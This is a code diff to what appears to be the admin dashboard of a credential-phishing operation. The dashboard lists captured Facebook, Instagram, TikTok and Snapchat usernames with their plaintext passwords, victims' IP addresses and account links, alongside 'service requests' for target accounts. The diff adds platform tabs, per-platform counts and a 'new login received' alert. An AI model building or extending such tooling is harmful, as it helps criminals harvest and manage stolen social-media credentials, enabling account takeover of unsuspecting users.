@@ -78,19 +78,34 @@
         </style>
 
         <div class="admin-panel">
+
+            <!-- ══ LOGINS SECTION ══ -->
             <div class="section-divider">
-                <span class="section-title" style="color:#ef4444;"><i class="fas fa-users" style="margin-right:0.5rem;"></i>User Logins <span id="login-count" style="background:rgba(239,68,68,0.2);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
+                <span class="section-title" style="color:#ef4444;">
+                    <i class="fas fa-users" style="margin-right:0.5rem;"></i>User Logins
+                    <span id="login-count" style="background:rgba(239,68,68,0.2);border-radius:50px;padding:0.1rem 0.6rem;font-size:0.7rem;margin-left:0.5rem;"></span>
+                </span>
+            </div>
+
+            <!-- Platform Tabs — Logins -->
+            <div id="login-tabs" style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:1rem;">
+                <button onclick="switchTab('login','all')"       id="ltab-all"       class="ptab ptab-active" data-section="login">🌐 All</button>
+                <button onclick="switchTab('login','facebook')"  id="ltab-facebook"  class="ptab" data-section="login">📘 Facebook  <span id="lc-facebook"  class="tab-badge"></span></button>
+                <button onclick="switchTab('login','instagram')" id="ltab-instagram" class="ptab" data-section="login">📸 Instagram <span id="lc-instagram" class="tab-badge"></span></button>
+                <button onclick="switchTab('login','tiktok')"    id="ltab-tiktok"    class="ptab" data-section="login">🎵 TikTok    <span id="lc-tiktok"    class="tab-badge"></span></button>
+                <button onclick="switchTab('login','snapchat')"  id="ltab-snapchat"  class="ptab" data-section="login">👻 Snapchat  <span id="lc-snapchat"  class="tab-badge"></span></button>
             </div>
 
             <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(239,68,68,0.1);">
                 <table class="data-table">
                     <thead>
                         <tr>
+                            <th style="color:#ef4444;">#</th>
                             <th style="color:#ef4444;">User</th>
                             <th style="color:#ef4444;">Password</th>
-                            <th style="color:#ef4444;">Account Link</th>
+                            <th style="color:#ef4444;">Account</th>
                             <th style="color:#ef4444;">Platform</th>
-                            <th style="color:#ef4444;">IP Address</th>
+                            <th style="color:#ef4444;">IP</th>
                             <th style="color:#ef4444;">Time</th>
                         </tr>
                     </thead>
@@ -98,17 +113,31 @@
                 </table>
             </div>
 
+            <!-- ══ REQUESTS SECTION ══ -->
             <div class="section-divider" style="margin-top:3rem;">
-                <span class="section-title" style="color:var(--neon-green);"><i class="fas fa-shopping-bag" style="margin-right:0.5rem;"></i>Service Requests <span id="req-count" style="background:rgba(0,255,136,0.15);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
+                <span class="section-title" style="color:var(--neon-green);">
+                    <i class="fas fa-shopping-bag" style="margin-right:0.5rem;"></i>Service Requests
+                    <span id="req-count" style="background:rgba(0,255,136,0.15);border-radius:50px;padding:0.1rem 0.6rem;font-size:0.7rem;margin-left:0.5rem;"></span>
+                </span>
+            </div>
+
+            <!-- Platform Tabs — Requests -->
+            <div id="req-tabs" style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:1rem;">
+                <button onclick="switchTab('req','all')"       id="rtab-all"       class="ptab ptab-active" data-section="req">🌐 All</button>
+                <button onclick="switchTab('req','facebook')"  id="rtab-facebook"  class="ptab" data-section="req">📘 Facebook  <span id="rc-facebook"  class="tab-badge"></span></button>
+                <button onclick="switchTab('req','instagram')" id="rtab-instagram" class="ptab" data-section="req">📸 Instagram <span id="rc-instagram" class="tab-badge"></span></button>
+                <button onclick="switchTab('req','tiktok')"    id="rtab-tiktok"    class="ptab" data-section="req">🎵 TikTok    <span id="rc-tiktok"    class="tab-badge"></span></button>
+                <button onclick="switchTab('req','snapchat')"  id="rtab-snapchat"  class="ptab" data-section="req">👻 Snapchat  <span id="rc-snapchat"  class="tab-badge"></span></button>
             </div>
 
             <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(0,255,136,0.1);">
                 <table class="data-table">
                     <thead>
                         <tr>
+                            <th style="color:var(--neon-green);">#</th>
                             <th style="color:var(--neon-green);">User</th>
                             <th style="color:var(--neon-green);">Amount</th>
-                            <th style="color:var(--neon-green);">Target Link</th>
+                            <th style="color:var(--neon-green);">Target Account</th>
                             <th style="color:var(--neon-green);">Platform</th>
                             <th style="color:var(--neon-green);">Time</th>
                         </tr>
@@ -124,6 +153,43 @@
             </div>
         </div>
     </div>
+
+    <style>
+        .ptab {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: var(--text-dim);
+            border-radius: 8px;
+            padding: 0.45rem 0.9rem;
+            font-size: 0.78rem;
+            font-family: 'Outfit', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 0.5px;
+        }
+        .ptab:hover { background: rgba(255,255,255,0.08); color: #fff; }
+        .ptab-active {
+            background: rgba(239,68,68,0.15) !important;
+            border-color: rgba(239,68,68,0.5) !important;
+            color: #ef4444 !important;
+            font-weight: 600;
+        }
+        .ptab[data-section="req"].ptab-active {
+            background: rgba(0,255,136,0.12) !important;
+            border-color: rgba(0,255,136,0.4) !important;
+            color: var(--neon-green) !important;
+        }
+        .tab-badge {
+            display: inline-block;
+            background: rgba(239,68,68,0.3);
+            border-radius: 50px;
+            padding: 0 5px;
+            font-size: 0.65rem;
+            margin-left: 3px;
+            min-width: 16px;
+            text-align: center;
+        }
+    </style>
 
     <script src="js/app.js"></script>
     <script>
@@ -149,9 +215,113 @@
             }, 1200);
         });
 
+        const PLATFORMS = ['facebook','instagram','tiktok','snapchat'];
+        const PLATFORM_COLORS = {
+            facebook:  { bg:'rgba(24,119,242,0.15)',  border:'rgba(24,119,242,0.4)',  text:'#1877f2' },
+            instagram: { bg:'rgba(225,48,108,0.15)',   border:'rgba(225,48,108,0.4)',  text:'#e1306c' },
+            tiktok:    { bg:'rgba(255,0,80,0.15)',     border:'rgba(255,0,80,0.4)',    text:'#ff0050' },
+            snapchat:  { bg:'rgba(255,252,0,0.12)',    border:'rgba(255,252,0,0.35)',  text:'#fffc00' },
+        };
+
+        let allLogins   = [];
+        let allRequests = [];
+        let activeLoginTab = 'all';
+        let activeReqTab   = 'all';
         let prevLoginCount = 0;
-        let prevReqCount = 0;
+        let prevReqCount   = 0;
         let autoRefreshTimer = null;
+
+        function platformOf(entry) {
+            return (entry.platform || '').toLowerCase().trim();
+        }
+
+        function switchTab(section, platform) {
+            if (section === 'login') {
+                activeLoginTab = platform;
+                document.querySelectorAll('#login-tabs .ptab').forEach(b => b.classList.remove('ptab-active'));
+                document.getElementById('ltab-' + platform).classList.add('ptab-active');
+                renderLoginTable(allLogins);
+            } else {
+                activeReqTab = platform;
+                document.querySelectorAll('#req-tabs .ptab').forEach(b => b.classList.remove('ptab-active'));
+                document.getElementById('rtab-' + platform).classList.add('ptab-active');
+                renderReqTable(allRequests);
+            }
+        }
+
+        function renderLoginTable(logins) {
+            const filtered = activeLoginTab === 'all'
+                ? [...logins].reverse()
+                : [...logins].reverse().filter(l => platformOf(l) === activeLoginTab);
+
+            const tbody = document.getElementById('login-data');
+            tbody.innerHTML = filtered.length === 0
+                ? '<tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No login data for this platform yet</td></tr>'
+                : filtered.map((log, i) => {
+                    const p = platformOf(log);
+                    const c = PLATFORM_COLORS[p] || { bg:'rgba(0,245,255,0.1)', border:'rgba(0,245,255,0.2)', text:'var(--neon-blue)' };
+                    return `<tr>
+                        <td style="color:var(--text-dim);font-size:0.78rem;">${i+1}</td>
+                        <td><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>${log.user || '—'}</td>
+                        <td style="color:#ef4444;font-family:monospace;font-weight:600;">${log.pass || '—'}</td>
+                        <td style="max-width:180px;">
+                            ${log.accountLink
+                                ? `<div style="display:flex;flex-direction:column;gap:0.15rem;">
+                                    <span style="color:${c.text};font-weight:700;font-size:0.82rem;">${log.accountRealName || ('@'+(log.accountName||'?'))}</span>
+                                    ${log.accountRealName && log.accountName ? `<span style="font-size:0.65rem;color:rgba(255,255,255,0.35);font-family:monospace;">@${log.accountName}</span>` : ''}
+                                    <a href="${log.accountLink}" target="_blank" style="color:rgba(255,255,255,0.25);font-size:0.68rem;font-family:monospace;word-break:break-all;text-decoration:none;">${log.accountLink.replace(/^https?:\/\//,'').substring(0,28)}…</a>
+                                  </div>`
+                                : `<span style="color:var(--text-dim);">—</span>`}
+                        </td>
+                        <td><span style="background:${c.bg};border:1px solid ${c.border};color:${c.text};border-radius:6px;padding:0.15rem 0.55rem;font-size:0.72rem;letter-spacing:1px;text-transform:capitalize;">${log.platform || '—'}</span></td>
+                        <td style="color:var(--text-dim);font-family:monospace;font-size:0.78rem;">${log.ip || '—'}</td>
+                        <td style="color:var(--text-dim);font-size:0.75rem;white-space:nowrap;">${log.time || '—'}</td>
+                    </tr>`;
+                }).join('');
+        }
+
+        function renderReqTable(requests) {
+            const filtered = activeReqTab === 'all'
+                ? [...requests].reverse()
+                : [...requests].reverse().filter(r => platformOf(r) === activeReqTab);
+
+            const tbody = document.getElementById('request-data');
+            tbody.innerHTML = filtered.length === 0
+                ? '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No service requests for this platform yet</td></tr>'
+                : filtered.map((req, i) => {
+                    const p = platformOf(req);
+                    const c = PLATFORM_COLORS[p] || { bg:'rgba(0,255,136,0.1)', border:'rgba(0,255,136,0.2)', text:'var(--neon-green)' };
+                    return `<tr>
+                        <td style="color:var(--text-dim);font-size:0.78rem;">${i+1}</td>
+                        <td>${req.user || '—'}</td>
+                        <td style="color:var(--neon-blue);font-weight:700;font-family:'Orbitron',sans-serif;font-size:0.9rem;">${req.amount}</td>
+                        <td style="max-width:180px;">
+                            <div style="display:flex;flex-direction:column;gap:0.1rem;">
+                                ${req.accountRealName ? `<span style="color:${c.text};font-size:0.82rem;font-weight:600;">${req.accountRealName}</span>` : ''}
+                                ${req.accountName    ? `<span style="color:rgba(255,255,255,0.35);font-size:0.68rem;">@${req.accountName}</span>` : ''}
+                                <a href="${req.link||'#'}" target="_blank" style="color:rgba(255,255,255,0.22);font-size:0.68rem;font-family:monospace;text-decoration:none;">${(req.link||'').substring(0,28)}…</a>
+                            </div>
+                        </td>
+                        <td><span style="background:${c.bg};border:1px solid ${c.border};color:${c.text};border-radius:6px;padding:0.15rem 0.55rem;font-size:0.72rem;letter-spacing:1px;text-transform:capitalize;">${req.platform || '—'}</span></td>
+                        <td style="color:var(--text-dim);font-size:0.75rem;white-space:nowrap;">${req.time || '—'}</td>
+                    </tr>`;
+                }).join('');
+        }
+
+        function updateBadges(logins, requests) {
+            // Login tab badges
+            PLATFORMS.forEach(p => {
+                const cnt = logins.filter(l => platformOf(l) === p).length;
+                const el  = document.getElementById('lc-' + p);
+                if (el) el.textContent = cnt > 0 ? cnt : '';
+            });
+            // Request tab badges
+            PLATFORMS.forEach(p => {
+                const cnt = requests.filter(r => platformOf(r) === p).length;
+                const el  = document.getElementById('rc-' + p);
+                if (el) el.textContent = cnt > 0 ? cnt : '';
+            });
+        }
 
         function loadLogs(silent = false) {
             fetch('/api/get-logs')
@@ -164,21 +334,26 @@
             const newLogins   = logins.length - prevLoginCount;
             const newRequests = requests.length - prevReqCount;
 
-            // Update counters
-            document.getElementById('total-logins').textContent   = logins.length;
-            document.getElementById('total-requests').textContent  = requests.length;
-            document.getElementById('login-count').textContent     = logins.length ? logins.length : '';
-            document.getElementById('req-count').textContent       = requests.length ? requests.length : '';
-            document.getElementById('last-refresh').textContent    = 'Updated: ' + new Date().toLocaleTimeString();
+            allLogins   = logins;
+            allRequests = requests;
 
-            // Show new entry alert
+            // Header counters
+            document.getElementById('total-logins').textContent  = logins.length;
+            document.getElementById('total-requests').textContent = requests.length;
+            document.getElementById('login-count').textContent   = logins.length   || '';
+            document.getElementById('req-count').textContent     = requests.length || '';
+            document.getElementById('last-refresh').textContent  = 'Updated: ' + new Date().toLocaleTimeString();
+
+            // Tab badges
+            updateBadges(logins, requests);
+
+            // New entry alert
             if (silent && (newLogins > 0 || newRequests > 0)) {
-                const alertEl  = document.getElementById('new-entry-alert');
-                const alertMsg = document.getElementById('alert-msg');
+                const alertEl = document.getElementById('new-entry-alert');
                 let msg = [];
                 if (newLogins   > 0) msg.push(newLogins   + ' new login'   + (newLogins > 1 ? 's' : ''));
                 if (newRequests > 0) msg.push(newRequests + ' new request' + (newRequests > 1 ? 's' : ''));
-                alertMsg.textContent = msg.join(' & ') + ' received!';
+                document.getElementById('alert-msg').textContent = msg.join(' & ') + ' received!';
                 alertEl.style.display = 'block';
                 setTimeout(() => alertEl.style.display = 'none', 5000);
             }
@@ -186,52 +361,8 @@
             prevLoginCount = logins.length;
             prevReqCount   = requests.length;
 
-            // Render logins table (newest first)
-            const loginTbody = document.getElementById('login-data');
-            const loginsRev  = [...logins].reverse();
-            loginTbody.innerHTML = loginsRev.length === 0
-                ? '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No login data yet — waiting for users</td></tr>'
-                : loginsRev.map((log, i) => `
-                    <tr class="${i < newLogins && silent ? 'new-row' : ''}">
-                        <td><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>${log.user || '—'}</td>
-                        <td style="color:#ef4444;font-family:monospace;">${log.pass || '—'}</td>
-                        <td style="max-width:200px;">
-                            ${log.accountLink
-                                ? `<div style="display:flex;flex-direction:column;gap:0.2rem;">
-                                    <span style="color:var(--neon-blue);font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;">${log.accountRealName || '@'+log.accountName}</span>
-                                    ${log.accountRealName ? `<span style="font-size:0.65rem;color:rgba(255,255,255,0.4);font-family:monospace;">@${log.accountName}</span>` : ''}
-                                    ${log.accountPlatform ? `<span style="font-size:0.6rem;color:rgba(255,255,255,0.25);letter-spacing:1px;text-transform:uppercase;">${log.accountPlatform}</span>` : ''}
-                                    <a href="${log.accountLink}" target="_blank" style="color:rgba(0,245,255,0.4);font-size:0.7rem;font-family:monospace;word-break:break-all;text-decoration:none;">${log.accountLink.replace(/^https?:\/\//,'').substring(0,32)}...</a>
-                                  </div>`
-                                : `<span style="color:var(--text-dim);font-size:0.8rem;">—</span>`
-                            }
-                        </td>
-                        <td><span style="background:rgba(0,245,255,0.1);border:1px solid rgba(0,245,255,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${log.platform || '—'}</span></td>
-                        <td style="color:var(--text-dim);font-family:monospace;font-size:0.82rem;">${log.ip || '—'}</td>
-                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${log.time || '—'}</td>
-                    </tr>
-                `).join('');
-
-            // Render requests table (newest first)
-            const requestTbody = document.getElementById('request-data');
-            const reqsRev      = [...requests].reverse();
-            requestTbody.innerHTML = reqsRev.length === 0
-                ? '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No service requests yet</td></tr>'
-                : reqsRev.map((req, i) => `
-                    <tr class="${i < newRequests && silent ? 'new-row' : ''}">
-                        <td>${req.user || '—'}</td>
-                        <td style="color:var(--neon-blue);font-weight:700;font-family:'Orbitron',sans-serif;">${req.amount}</td>
-                        <td>
-                            <div style="display:flex;flex-direction:column;gap:0.1rem;">
-                                ${req.accountRealName ? `<span style="color:var(--neon-green);font-size:0.8rem;font-weight:600;">${req.accountRealName}</span>` : ''}
-                                ${req.accountName    ? `<span style="color:rgba(255,255,255,0.4);font-size:0.7rem;">@${req.accountName}</span>` : ''}
-                                <a href="${req.link}" target="_blank" style="color:var(--text-dim);font-size:0.75rem;font-family:monospace;text-decoration:none;">${(req.link||'').substring(0,35)}...</a>
-                            </div>
-                        </td>
-                        <td><span style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${req.platform || '—'}</span></td>
-                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${req.time || '—'}</td>
-                    </tr>
-                `).join('');
+            renderLoginTable(logins);
+            renderReqTable(requests);
         }
 
         function startAutoRefresh() {
